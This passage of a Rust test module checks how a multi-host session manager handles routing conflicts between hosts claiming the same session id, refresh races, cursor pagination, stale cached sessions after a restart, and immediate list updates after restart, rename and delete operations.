        assert_eq!(
            status,
            axum::http::StatusCode::OK,
            "an identity-less host's sessions must route like any other: {body}"
        );
        peer.await.unwrap();

        harness.fleet.take_down(host);
        harness
            .await_state(host, |state| state.phase() == "unreachable-reprobing")
            .await;

        let (_, value) = get_json(&harness, "/api/sessions").await;
        assert!(
            row_ids(&value).is_empty(),
            "with no durable copy there is nothing to serve stale: {value}"
        );
        assert_eq!(value["total"], 0);
        let (status, _) = get_json(&harness, "/api/sessions/unbound-1").await;
        assert_eq!(
            status,
            axum::http::StatusCode::NOT_FOUND,
            "and nothing to show behind a host-unreachable notice either"
        );
    }

    /// A hostile or buggy supervisor claiming another host's session id must
    /// not be able to steer an operation to the wrong machine — and while
    /// the claim STANDS, no operation goes anywhere at all.
    ///
    /// Two rules, and the second is the one worth being explicit about.
    /// helm.db refuses the second claim outright, so the LIST is coherent:
    /// the first host keeps the session and the impostor's row is dropped.
    /// But a session two hosts both report is genuinely ambiguous, and the
    /// helm has no basis for deciding which of them the user meant — so
    /// ROUTING fails closed for as long as both keep reporting it, rather
    /// than quietly choosing the one that happened to cache first.
    ///
    /// The contest is refresh STATE, not a remembered incident: when the
    /// impostor stops reporting the id, the next drain rebuilds its
    /// contested set without it and routing resumes with no intervention.
    /// That second half is asserted here because it is what makes the
    /// refusal a temporary, self-clearing condition rather than a session
    /// bricked by someone else's bug.
    #[tokio::test]
    async fn a_second_host_claiming_a_session_id_never_steals_its_routing() {
        use farhelm_proto::ControlMsg;
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};

        let (owner_client, owner_peer) = tokio::io::duplex(64 * 1024);
        let owner_task = tokio::spawn(async move {
            let (r, w) = tokio::io::split(owner_peer);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
            let ControlMsg::StopSession { req_id, session_id } = request else {
                panic!("expected StopSession, got {request:?}");
            };
            assert_eq!(session_id, "contested");
            writer
                .write_control(&ControlMsg::SessionStopped { req_id })
                .await
                .unwrap();
        });
        let (impostor_client, impostor_peer) = tokio::io::duplex(64 * 1024);
        let impostor_task = tokio::spawn(silent_supervisor(impostor_peer));

        let (builder, owner) = rest_harness::FleetBuilder::new()
            .await
            .ssh(
                "user@owner",
                rest_harness::HostScript {
                    identity: Some("identity-owner".to_string()),
                    sessions: vec![rest_harness::session("contested", 100)],
                    peer: Some(owner_client),
                    ..rest_harness::HostScript::default()
                },
            )
            .await;
        let (builder, impostor) = builder
            .ssh(
                "user@impostor",
                rest_harness::HostScript {
                    identity: Some("identity-impostor".to_string()),
                    // The same id, from a machine that does not own it.
                    sessions: vec![rest_harness::session("contested", 100)],
                    peer: Some(impostor_client),
                    // Held down until the owner has cached, so "first claim
                    // holds" has a defined first. Two hosts racing to claim
                    // one id is a real situation and either may win it, but
                    // a test whose subject is what happens to the LOSER
                    // cannot also leave who loses to chance.
                    reachable: false,
                    ..rest_harness::HostScript::default()
                },
            )
            .await;
        let harness = builder.start().await;
        harness.await_refreshed(owner).await;

        harness
            .fleet
            .edit(impostor, |script| script.reachable = true);
        harness
            .manager
            .retry_now(impostor)
            .await
            .expect("the impostor is registered");
        harness.await_refreshed(impostor).await;

        let (_, value) = get_json(&harness, "/api/sessions").await;
        assert_eq!(
            row_ids(&value),
            vec!["contested"],
            "the contested id appears exactly once, not once per claimant: {value}"
        );
        assert_eq!(
            value["sessions"][0]["host"], owner,
            "the first claim holds; the later claimant's row is dropped"
        );

        // While BOTH report it, there is no honest owner to route to.
        let (status, body) = post_text(
            &harness,
            "/api/sessions/contested/stop",
            serde_json::json!({}),
        )
        .await;
        assert_eq!(
            status,
            axum::http::StatusCode::CONFLICT,
            "a session two hosts both claim must not be routed to either: {body}"
        );
        assert!(
            body.contains(&owner.to_string()) && body.contains(&impostor.to_string()),
            "and the refusal must name both candidates so the user can fix it: {body}"
        );

        // The impostor stops claiming it. Nothing is told to forget
        // anything — the contest is rebuilt from the next drain's evidence,
        // and that evidence no longer contains the id.
        harness
            .fleet
            .edit(impostor, |script| script.sessions = Vec::new());
        harness.fleet.kill_connection(impostor);
        harness
            .await_refreshed_as(impostor, "identity-impostor", 0)
            .await;

        let (status, body) = post_text(
            &harness,
            "/api/sessions/contested/stop",
            serde_json::json!({}),
        )
        .await;
        assert_eq!(
            status,
            axum::http::StatusCode::OK,
            "a contest clears itself when the claimant stops claiming: {body}"
        );
        owner_task.await.unwrap();
        // The impostor must never have been asked anything about it.
        impostor_task.await.unwrap();

        let (status, value) = get_json(&harness, "/api/sessions/contested").await;
        assert_eq!(status, axum::http::StatusCode::OK);
        assert_eq!(
            value["host"], owner,
            "the detail route and the routing decision must name the SAME host"
        );
    }

    /// A refresh whose drain PREDATES a create must not erase the create.
    ///
    /// The window is wide and entirely ordinary: a refresh drains a host's
    /// whole list over the network, a create lands during that drain and is
    /// recorded, and the drain then commits a wholesale replacement built
    /// from a snapshot in which the new session did not exist. The caller
    /// has already been told its session exists; the list and the routing
    /// would then contradict the answer they just gave it.
    ///
    /// Driven by a BARRIER rather than by timing: the scripted host's second
    /// list reply is held until the create has completed, so the
    /// interleaving under test is the one that actually happens rather than
    /// whichever one a sleep happened to produce.
    #[tokio::test]
    async fn a_refresh_that_predates_a_create_cannot_erase_it() {
        use farhelm_proto::ControlMsg;
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};

        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(async move {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            loop {
                let Ok(Some(frame)) = reader.read_frame().await else {
                    return;
                };
                let Ok(ControlMsg::CreateSession { req_id, .. }) = parse_control(&frame) else {
                    return;
                };
                writer
                    .write_control(&ControlMsg::SessionCreated {
                        req_id,
                        session: rest_harness::session("created-mid-drain", 900),
                    })
                    .await
                    .unwrap();
            }
        });

        // Refreshing briskly, so a second walk really is in flight while the
        // create runs. The host's canned list never mentions the new
        // session — which is the point: it describes the world before it.
        let harness = rest_harness::FleetBuilder::new()
            .await
            .refresh_every(std::time::Duration::from_millis(20))
            .local(rest_harness::HostScript {
                identity: Some("local-identity".to_string()),
                sessions: vec![rest_harness::session("pre-existing", 100)],
                peer: Some(client_side),
                ..rest_harness::HostScript::default()
            })
            .await
            .start()
            .await;
        let local = rest_harness::local_id(&harness.store).await;
        harness.await_refreshed(local).await;

        // Arm the barrier, then wait until the held walk has actually
        // STARTED: from here on, whatever it eventually replies describes a
        // world that predates the create below.
        let release = harness.fleet.hold_next_list(local);
        harness.fleet.await_list_requests(2).await;

        let (status, body) = post_text(
            &harness,
            "/api/sessions",
            serde_json::json!({ "cwd": "/tmp", "invocation": "agent" }),
        )
        .await;
        assert_eq!(status, axum::http::StatusCode::OK, "{body}");

        // The host now genuinely has the session, as a real one would the
        // moment it answered the create. Only the HELD reply — built before
        // any of this — still describes the world without it.
        harness.fleet.edit(local, |script| {
            script.sessions = vec![
                rest_harness::session("created-mid-drain", 900),
                rest_harness::session("pre-existing", 100),
            ];
        });

        // Let the stale walk commit — or rather, discover that it may not.
        let _ = release.send(());
        // The held walk has committed (or declined to) by the time the NEXT
        // one has started, which is a state the fleet reports rather than a
        // duration this test has to guess at.
        harness.fleet.await_list_requests(3).await;

        let (status, value) = get_json(&harness, "/api/sessions").await;
        assert_eq!(status, axum::http::StatusCode::OK);
        let mut ids = row_ids(&value);
        ids.sort();
        assert_eq!(
            ids,
            vec!["created-mid-drain", "pre-existing"],
            "a refresh built before the create must not erase it: {value}"
        );

        // And it is routable, which is the promise the create made.
        let (host, _) = crate::resolve_owner(&harness.state, "created-mid-drain")
            .await
            .expect("the created session must still have an owner");
        assert_eq!(host, local);
        peer.abort();
    }

    /// A byte-bounded persisted scan must FENCE the merge: a live host's
    /// rows may not carry the cursor past cached rows nobody has been shown.
    ///
    /// The interleaving is specific and the loss is permanent. The store's
    /// scan stops on its byte bound having returned FEWER rows than the
    /// page asked for, so the merge still has capacity — and fills it from
    /// an identity-less host's in-memory list, whose rows sort after the
    /// cached ones the scan never reached. The page's cursor then names a
    /// live row, and the next page resumes after it: every cached row
    /// between the byte cut and that position is skipped, forever, with
    /// nothing about either page looking wrong.
    ///
    /// The fixture is exactly that shape — one fat cached row, an unseen
    /// cached successor, and a live row that sorts between them by time.
    #[tokio::test]
    async fn a_byte_cut_persisted_scan_fences_the_merge() {
        let fat = farhelm_proto::SessionInfo {
            // Alone larger than the page budget, so the scan stops right
            // after it with a successor still unread.
            title: "x".repeat(5 * 1024 * 1024),
            ..rest_harness::session("cached-fat", 500)
        };
        let (builder, cached_host) = rest_harness::FleetBuilder::new()
            .await
            .ssh(
                "user@cached",
                rest_harness::HostScript {
                    identity: Some("identity-cached".to_string()),
                    // The successor sorts LAST, so a merge that ran past
                    // the fence would leave it behind.
                    sessions: vec![fat, rest_harness::session("cached-next", 100)],
                    ..rest_harness::HostScript::default()
                },
            )
            .await;
        let (builder, live_host) = builder
            .ssh(
                "user@live",
                rest_harness::HostScript {
                    // No identity: this host caches nothing and serves from
                    // the manager's memory, which is the other side of the
                    // merge.
                    identity: None,
                    sessions: vec![rest_harness::session("live-middle", 300)],
                    ..rest_harness::HostScript::default()
                },
            )
            .await;
        let harness = builder.start().await;
        harness.await_refreshed(cached_host).await;
        harness.await_refreshed(live_host).await;

        // Walk the whole list one page at a time. Every row must appear
        // exactly once, in order — the property a fence-less merge breaks
        // silently.
        let mut walked: Vec<String> = Vec::new();
        let mut uri = "/api/sessions?limit=10".to_string();
        for _ in 0..10 {
            let (status, value) = get_json(&harness, &uri).await;
            assert_eq!(status, axum::http::StatusCode::OK);
            walked.extend(row_ids(&value));
            match value["next_cursor"].as_str() {
                None => break,
                Some(cursor) => uri = format!("/api/sessions?limit=10&cursor={cursor}"),
            }
        }
        assert_eq!(
            walked,
            vec!["cached-fat", "live-middle", "cached-next"],
            "every row exactly once, in the merged order — a fence-less merge loses the cached \
             row after the byte cut"
        );
    }

    /// The helm cursor must survive sessions coming and going between
    /// pages, and `truncated` must be true on every page but the last.
    ///
    /// The stability half is the whole reason the cursor encodes a KEY: an
    /// offset would shift under both mutations and silently re-serve or skip
    /// a row, with nothing a caller could observe. The `truncated` half is
    /// what the pre-M6 UI reads to draw "showing N of M", so it has to mean
    /// something exact — "there is a next page" — rather than approximately.
    #[tokio::test]
    async fn a_page_walk_survives_creation_and_deletion_between_pages() {
        let (harness, alpha, _beta) = three_host_fleet().await;

        let (_, first) = get_json(&harness, "/api/sessions?limit=2").await;
        assert_eq!(row_ids(&first), vec!["beta-newest", "alpha-new"]);
        assert_eq!(
            first["truncated"], true,
            "entries remain, so this is not the final page"
        );
        let cursor = first["next_cursor"]
            .as_str()
            .expect("more pages")
            .to_string();

        // The row the cursor NAMES is deleted, and a brand-new session
        // appears at the very front of the order — the two mutations a walk
        // must be indifferent to.
        harness.fleet.edit(alpha, |script| {
            script.sessions = vec![
                rest_harness::session("alpha-brand-new", 9_999),
                rest_harness::session("alpha-old", 100),
            ];
        });
        harness.fleet.kill_connection(alpha);
        harness
            .await_state(alpha, |state| {
                matches!(
                    state,
                    crate::manager::HostState::Connected {
                        last_refresh: crate::manager::RefreshHealth::Ok { sessions: 2 },
                        ..
                    }
                )
            })
            .await;

        let (_, second) =
            get_json(&harness, &format!("/api/sessions?limit=2&cursor={cursor}")).await;
        assert_eq!(
            row_ids(&second),
            vec!["local-mid", "alpha-old"],
            "the walk resumes strictly after the deleted row's key, and never rewinds to the \
             newly created one"
        );
        let cursor = second["next_cursor"]
            .as_str()
            .expect("one more")
            .to_string();
        let (_, third) =
            get_json(&harness, &format!("/api/sessions?limit=2&cursor={cursor}")).await;
        assert_eq!(row_ids(&third), vec!["beta-oldest"]);
        assert_eq!(
            third["truncated"], false,
            "the final page says so, which is what stops a walking caller"
        );
        assert_eq!(third["next_cursor"], serde_json::Value::Null);
    }

    /// An over-large `?limit=` is refused rather than silently clamped.
    ///
    /// Silently clamping would leave a caller that asked for fifty thousand
    /// and got five thousand with no way to tell it had not got what it
    /// asked for — the reply looks identical to a genuinely short page.
    #[tokio::test]
    async fn an_over_large_page_limit_is_refused() {
        let (harness, _alpha, _beta) = three_host_fleet().await;
        let (status, body) = get_json(
            &harness,
            &format!(
                "/api/sessions?limit={}",
                crate::aggregate::MAX_PAGE_LIMIT + 1
            ),
        )
        .await;
        assert_eq!(
            status,
            axum::http::StatusCode::BAD_REQUEST,
            "an unbounded page is a request to do all the work at once: {body}"
        );
        let (status, _) = get_json(
            &harness,
            &format!("/api/sessions?limit={}", crate::aggregate::MAX_PAGE_LIMIT),
        )
        .await;
        assert_eq!(
            status,
            axum::http::StatusCode::OK,
            "the cap itself is legal"
        );
    }

    /// A create naming a host id nothing holds must 404, and must not fall
    /// back to any other host.
    ///
    /// The fallback is the dangerous half: a create that quietly landed on
    /// the local machine because the named host was gone would put a live
    /// agent somewhere the user never asked for, and the reply would look
    /// like success. The silent supervisor is what turns "no fallback" into
    /// an assertion rather than a claim.
    #[tokio::test]
    async fn creating_on_an_unknown_host_is_refused_without_falling_back() {
        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(silent_supervisor(peer_side));
        let harness = rest_harness::spliced_helm(client_side).await;

        let (status, body) = post_text(
            &harness,
            "/api/sessions",
            serde_json::json!({ "cwd": "/tmp", "invocation": "agent", "host": 9999 }),
        )
        .await;
        assert_eq!(
            status,
            axum::http::StatusCode::NOT_FOUND,
            "a create naming a host nothing holds is a 404, not a create somewhere else: {body}"
        );
        peer.await.unwrap();
    }

    /// The stale list must survive a HELM restart: a fresh helm over the
    /// same helm.db, with the host still down and no ensure file, serves
    /// its sessions from the database alone.
    ///
    /// PLAN_M6.md's testing decisions are explicit that the restart leg runs
    /// WITHOUT the ensure file, because an ensure file would rebuild the
    /// registry entry and mask a broken persistence path — the assertion is
    /// that the destination, the identity, and the stale sessions all come
    /// from helm.db.
    #[tokio::test]
    async fn the_stale_list_survives_a_helm_restart_from_helm_db_alone() {
        let (builder, host) = rest_harness::FleetBuilder::new()
            .await
            .ssh(
                "user@remembered",
                rest_harness::HostScript {
                    identity: Some("identity-remembered".to_string()),
                    sessions: vec![rest_harness::session("survivor", 100)],
                    ..rest_harness::HostScript::default()
                },
            )
            .await;
        let first = builder.start().await;
        first.await_refreshed(host).await;
        let (_, before) = get_json(&first, "/api/sessions").await;
        assert_eq!(row_ids(&before), vec!["survivor"]);

        // A NEW helm over the same database, with the host now down — the
        // manager, its actors, and the router are all built from scratch.
        let restarted = first.restart_with(|fleet| fleet.take_down(host)).await;
        restarted
            .await_state(host, |state| state.phase() == "unreachable-reprobing")
            .await;

        let (status, value) = get_json(&restarted, "/api/sessions").await;
        assert_eq!(status, axum::http::StatusCode::OK);
        assert_eq!(
            row_ids(&value),
            vec!["survivor"],
            "the stale list must come back from helm.db alone: {value}"
        );
        assert_eq!(value["sessions"][0]["stale"], true);
        assert_eq!(value["sessions"][0]["host_name"], "user@remembered");

        let (_, hosts) = get_json(&restarted, "/api/hosts").await;
        let row = hosts["hosts"]
            .as_array()
            .unwrap()
            .iter()
            .find(|entry| entry["id"] == host)
            .expect("the registry entry survived too");
        assert_eq!(
            row["identity"], "identity-remembered",
            "the identity is durable, not re-learned from a host that is down"
        );
    }

    /// A session created on an IDENTITY-LESS host must be routable at once,
    /// exactly like one created on a host that caches.
    ///
    /// Such a host writes no cache at all, so the create's durable seed has
    /// nowhere to go — and the version of this that only seeded the store
    /// skipped it silently, leaving every immediate operation 404ing on
    /// precisely the hosts whose sessions are hardest to see. The promise is
    /// "created here is routable now", and it cannot hold for one storage
    /// shape and not the other.
    #[tokio::test]
    async fn a_session_created_on_an_identity_less_host_is_routable_at_once() {
        use farhelm_proto::ControlMsg;
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};

        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(async move {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            loop {
                let Ok(Some(frame)) = reader.read_frame().await else {
                    return;
                };
                match parse_control(&frame) {
                    Ok(ControlMsg::CreateSession { req_id, .. }) => writer
                        .write_control(&ControlMsg::SessionCreated {
                            req_id,
                            session: rest_harness::session("unbound-new", 900),
                        })
                        .await
                        .unwrap(),
                    Ok(ControlMsg::StopSession { req_id, session_id }) => {
                        assert_eq!(session_id, "unbound-new");
                        writer
                            .write_control(&ControlMsg::SessionStopped { req_id })
                            .await
                            .unwrap();
                    }
                    _ => return,
                }
            }
        });

        let (builder, host) = rest_harness::FleetBuilder::new()
            .await
            .ssh(
                "user@no-identity",
                rest_harness::HostScript {
                    identity: None,
                    sessions: Vec::new(),
                    peer: Some(client_side),
                    ..rest_harness::HostScript::default()
                },
            )
            .await;
        let harness = builder.start().await;
        harness.await_refreshed(host).await;

        let (status, body) = post_text(
            &harness,
            "/api/sessions",
            serde_json::json!({ "cwd": "/tmp", "invocation": "agent", "host": host }),
        )
        .await;
        assert_eq!(status, axum::http::StatusCode::OK, "{body}");

        let (status, body) = post_text(
            &harness,
            "/api/sessions/unbound-new/stop",
            serde_json::json!({}),
        )
        .await;
        assert_eq!(
            status,
            axum::http::StatusCode::OK,
            "a session created on an identity-less host must route immediately too: {body}"
        );

        // And it is in the list, in order, without waiting for a refresh.
        let (_, value) = get_json(&harness, "/api/sessions").await;
        assert_eq!(row_ids(&value), vec!["unbound-new"]);
        assert_eq!(value["total"], 1);
        peer.abort();
    }

    /// A restart's reply must reach the LIST immediately, not at the owning
    /// host's next refresh tick — and a delete must leave it immediately
    /// too.
    ///
    /// The browser suite caught both as user-visible lies. A restart of an
    /// exited session succeeded while the list went on saying `exited` for a
    /// poll interval; and its own shared-session reset (delete, then create)
    /// left the deleted row listed beside the new one, so a strict locator
    /// found two rows where the test meant one. The merged view serves what
    /// the helm has RECORDED, so every mutation that changes what a session
    /// is — or whether it is — records the result.
    #[tokio::test]
    async fn a_restart_and_a_rename_reach_the_list_without_waiting_for_a_refresh() {
        use farhelm_proto::ControlMsg;
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};

        let exited = farhelm_proto::SessionInfo {
            status: farhelm_proto::SessionStatus::Exited { exit_code: Some(1) },
            ..rest_harness::session("sess-1", 500)
        };
        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let renamed = farhelm_proto::SessionInfo {
            title: "renamed-later".to_string(),
            ..rest_harness::session("sess-1", 500)
        };
        let peer = tokio::spawn(async move {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            loop {
                let Ok(Some(frame)) = reader.read_frame().await else {
                    return;
                };
                match parse_control(&frame) {
                    // The host now reports it ALIVE — the whole point of
                    // the restart the caller just made.
                    Ok(ControlMsg::RestartSession { req_id, .. }) => writer
                        .write_control(&ControlMsg::SessionRestarted {
                            req_id,
                            session: rest_harness::session("sess-1", 500),
                        })
                        .await
                        .unwrap(),
                    Ok(ControlMsg::RenameSession { req_id, .. }) => writer
                        .write_control(&ControlMsg::SessionRenamed {
                            req_id,
                            session: renamed.clone(),
                        })
                        .await
                        .unwrap(),
                    Ok(ControlMsg::DeleteSession { req_id, .. }) => writer
                        .write_control(&ControlMsg::SessionDeleted { req_id })
                        .await
                        .unwrap(),
                    _ => return,
                }
            }
        });

        // The cached row says `exited`, and the harness refreshes once an
        // hour — so anything the list shows differently was recorded by the
        // mutation itself.
        let harness = rest_harness::spliced_helm_listing(client_side, vec![exited]).await;
        let (_, before) = get_json(&harness, "/api/sessions").await;
        assert_eq!(before["sessions"][0]["status"]["state"], "exited");

        let (status, body) = post_text(
            &harness,
            "/api/sessions/sess-1/restart",
            serde_json::json!({ "mode": "fresh" }),
        )
        .await;
        assert_eq!(status, axum::http::StatusCode::OK, "{body}");
        let (_, after) = get_json(&harness, "/api/sessions").await;
        assert_eq!(
            after["sessions"][0]["status"]["state"], "alive",
            "a completed restart must not leave the list showing the state it restarted FROM"
        );

        let (status, body) = post_text(
            &harness,
            "/api/sessions/sess-1/rename",
            serde_json::json!({ "title": "renamed-later" }),
        )
        .await;
        assert_eq!(status, axum::http::StatusCode::OK, "{body}");
        let (_, after) = get_json(&harness, "/api/sessions").await;
        assert_eq!(
            after["sessions"][0]["title"], "renamed-later",
            "and a completed rename must not either"
        );

        // A delete is the quadrant the browser suite found missing: the row
        // must be gone from the list the moment the delete answers, not at
        // the next refresh.
        let request = axum::http::Request::builder()
            .method("DELETE")
            .uri("/api/sessions/sess-1")
            .header("host", "127.0.0.1:7433")
            .body(axum::body::Body::empty())
            .unwrap();
        let response = tower::ServiceExt::oneshot(harness.router(), request)
            .await
            .unwrap();
        assert_eq!(response.status(), axum::http::StatusCode::OK);
        let (_, after) = get_json(&harness, "/api/sessions").await;
        assert!(
            row_ids(&after).is_empty(),
            "a deleted session must leave the list at once, or a delete-then-create shows both: \
             {after}"
        );
        peer.abort();
    }

    /// A mutation reply that says `Unknown` must not erase a status the
    /// helm already knew.
    ///
    /// This is the lost-restart-reply case, reduced to the fact that
    /// produced it. The browser suite's `a restart whose response is lost
    /// still recovers the terminal` restarts a LIVE session with the reply
    /// dropped on the client side, then reads the list and expects `alive`.
    /// The restart itself really happened — the supervisor relaunched, and
    /// the helm received and recorded the reply — but that reply carries
    /// `SessionStatus::Unknown` BY CONTRACT: at the instant it is built the
    /// pane exists and the agent's own `exec` inside it has not been
    /// observed, and `SessionStatus::Unknown`'s own docs are explicit that
    /// `ListSessions` is the only reply computing a real answer. Recording
    /// it verbatim answered a successful restart with "the helm has no
    /// idea", for a session it had definite knowledge about a moment
    /// earlier.
    ///
    /// Both directions are pinned, because the rule is narrow on purpose: a
    /// DEFINITE status in a reply is authoritative and wins immediately
    /// (that is what makes a restart show `alive` without a refresh), and
    /// only `Unknown` defers to what was already known. Every other field
    /// of the reply is taken as given in both cases — the status alone is
    /// knowledge the reply does not have.
    #[tokio::test]
    async fn a_reply_carrying_unknown_never_erases_a_known_status() {
        use farhelm_proto::ControlMsg;
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};

        let alive = rest_harness::session("sess-1", 500);
        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(async move {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            loop {
                let Ok(Some(frame)) = reader.read_frame().await else {
                    return;
                };
                let Ok(ControlMsg::RestartSession { req_id, .. }) = parse_control(&frame) else {
                    return;
                };
                // Exactly what a real supervisor sends: a fresh offer and
                // a deliberately unknown status (`publish_relaunched`).
                writer
                    .write_control(&ControlMsg::SessionRestarted {
                        req_id,
                        session: farhelm_proto::SessionInfo {
                            status: farhelm_proto::SessionStatus::Unknown,
                            restart_offer: farhelm_proto::RestartOffer::FreshOnly,
                            title: "restarted".to_string(),
                            ..rest_harness::session("sess-1", 500)
                        },
                    })
                    .await
                    .unwrap();
            }
        });

        // The cached row is ALIVE, and the harness refreshes once an hour —
        // so nothing but this restart can change what the list says.
        let harness = rest_harness::spliced_helm_listing(client_side, vec![alive]).await;
        let (_, before) = get_json(&harness, "/api/sessions").await;
        assert_eq!(before["sessions"][0]["status"]["state"], "alive");

        let (status, body) = post_text(
            &harness,
            "/api/sessions/sess-1/restart",
            serde_json::json!({ "mode": "fresh" }),
        )
        .await;
        assert_eq!(status, axum::http::StatusCode::OK, "{body}");

        let (_, after) = get_json(&harness, "/api/sessions").await;
        assert_eq!(
            after["sessions"][0]["status"]["state"], "alive",
            "a reply that says 'not yet known' must not replace knowledge with its absence: \
             {after}"
        );
        assert_eq!(
            after["sessions"][0]["title"], "restarted",
            "every other field of the reply is authoritative and lands at once"
        );
        assert_eq!(
            after["sessions"][0]["restart_offer"], "fresh_only",
            "including the freshly recomputed offer the restart exists to produce"
        );
        peer.abort();
    }

    /// A mutation whose reply could not improve the cached status must
    /// WAKE the owning host's refresh, so the definite answer arrives in one
    /// round trip rather than one refresh interval.
    ///
    /// This is the other half of the no-degrade rule, and without it that
    /// rule pays for its own correctness with a visible lag. Restarting an
    /// EXITED session is the case that shows it: the reply says `Unknown`
    /// (deliberately — the pane exists, the agent's exec has not been
    /// observed), the merge declines to record it over the cached `exited`,
    /// and the list therefore goes on saying `exited` after a restart that
    /// succeeded. A user watching that sees their own successful action
    /// look like a failed one, for as long as the cadence says — which is
    /// exactly what the browser suite caught, on one engine and not the
    /// other, because a one-shot assertion races the interval.
    ///
    /// The harness refreshes once an HOUR and this test never advances the
    /// clock, so the transition asserted below cannot have come from the
    /// ordinary cadence: only the wake can have produced it. The woken drain
    /// must also be a POST-seed one — it samples the seed epoch when it
    /// starts, so a pre-seed snapshot would correctly decline to commit and
    /// leave the lag in place.
    #[tokio::test]
    async fn a_restart_that_cannot_improve_the_status_wakes_the_refresh() {
        use farhelm_proto::ControlMsg;
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};

        let exited = farhelm_proto::SessionInfo {
            status: farhelm_proto::SessionStatus::Exited { exit_code: Some(1) },
            ..rest_harness::session("sess-1", 500)
        };
        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(async move {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            loop {
                let Ok(Some(frame)) = reader.read_frame().await else {
                    return;
                };
                let Ok(ControlMsg::RestartSession { req_id, .. }) = parse_control(&frame) else {
                    return;
                };
                // What a real supervisor sends: the relaunch happened, and
                // its liveness is not yet knowable.
                writer
                    .write_control(&ControlMsg::SessionRestarted {
                        req_id,
                        session: farhelm_proto::SessionInfo {
                            status: farhelm_proto::SessionStatus::Unknown,
                            ..rest_harness::session("sess-1", 500)
                        },
                    })
                    .await
                    .unwrap();
            }
        });

        let harness = rest_harness::spliced_helm_listing(client_side, vec![exited]).await;
        let (_, before) = get_json(&harness, "/api/sessions").await;
        assert_eq!(before["sessions"][0]["status"]["state"], "exited");

        // The host is ALIVE from here on — which the helm can only learn by
        // listing again.
        harness
            .fleet
            .edit(rest_harness::local_id(&harness.store).await, |script| {
                script.sessions = vec![rest_harness::session("sess-1", 500)];
            });

        let (status, body) = post_text(
            &harness,
            "/api/sessions/sess-1/restart",
            serde_json::json!({ "mode": "fresh" }),
        )
        .await;
        assert_eq!(status, axum::http::StatusCode::OK, "{body}");

        // Wait for the SECOND list request — the woken drain. Counting
        // requests rather than watching for a refresh state is what makes
        // this deterministic: the connect-time refresh already produced a
        // successful one-session result, so a state-shaped wait is
        // satisfied by the pre-restart pass and proves nothing. No clock is
        // advanced anywhere in this test, so a second request can only have
        // come from the wake — and the bound turns a missing one into a
        // failed test rather than a hung CI run.
        tokio::time::timeout(
            std::time::Duration::from_secs(30),
            harness.fleet.await_list_requests(2),
        )
        .await
        .expect("the write must wake a refresh; no second list request ever arrived");
        // The wait above resolves when the fake RECEIVES the second request;
        // the helm still has to process the reply and commit it, and a loaded
        // runner can stretch that gap past a one-shot assertion (seen twice
        // in full-workspace runs, never in isolation). Polling briefly does
        // not weaken the proof: the cadence is an hour of real time, so
        // within this window the woken drain is still the only thing that
        // can have produced the transition.
        let deadline = tokio::time::Instant::now() + std::time::Duration::from_secs(10);
        let after = loop {
            let (_, after) = get_json(&harness, "/api/sessions").await;
            if after["sessions"][0]["status"]["state"] == "alive"
                || tokio::time::Instant::now() >= deadline
            {
                break after;
            }
            tokio::time::sleep(std::time::Duration::from_millis(25)).await;
        };
        assert_eq!(
            after["sessions"][0]["status"]["state"], "alive",
            "the definite status must arrive in one round trip, not one refresh interval: {after}"
        );
        peer.abort();
    }

    /// A stale session's DETAIL is served, not refused — the one
    /// `/api/sessions/{id}` route a down host does not turn away.
    ///
    /// SPEC.md: "opening such a session shows its metadata — title,
    /// directory, last-known status — behind a clear host-unreachable
    /// notice". Refusing here would leave the UI nothing to draw behind
    /// that notice, so the read is served from the cache and marked
    /// `stale`, while every mutating route on the same session still
    /// refuses (pinned above).
    #[tokio::test]
    async fn a_stale_sessions_detail_is_served_from_the_cache_and_marked_stale() {
        let (builder, host) = rest_harness::FleetBuilder::new()
            .await
            .ssh(
                "user@breaks",
                rest_harness::HostScript {
                    identity: Some("identity-original".to_string()),
                    sessions: vec![farhelm_proto::SessionInfo {
                        title: "the work in progress".to_string(),
                        cwd: "/home/user/project".to_string(),
                        ..rest_harness::session("owned", 100)
                    }],
                    ..rest_harness::HostScript::default()
                },
            )
            .await;
        let harness = builder.start().await;
        harness.await_refreshed(host).await;
        harness.fleet.take_down(host);
        harness
            .await_state(host, |state| state.phase() == "unreachable-reprobing")
            .await;

        let (status, value) = get_json(&harness, "/api/sessions/owned").await;
        assert_eq!(status, axum::http::StatusCode::OK);
        assert_eq!(value["title"], "the work in progress");
        assert_eq!(value["cwd"], "/home/user/project");
        assert_eq!(value["host"], host);
        assert_eq!(
            value["stale"], true,
            "the metadata is last-known knowledge and must say so"
        );
    }
}
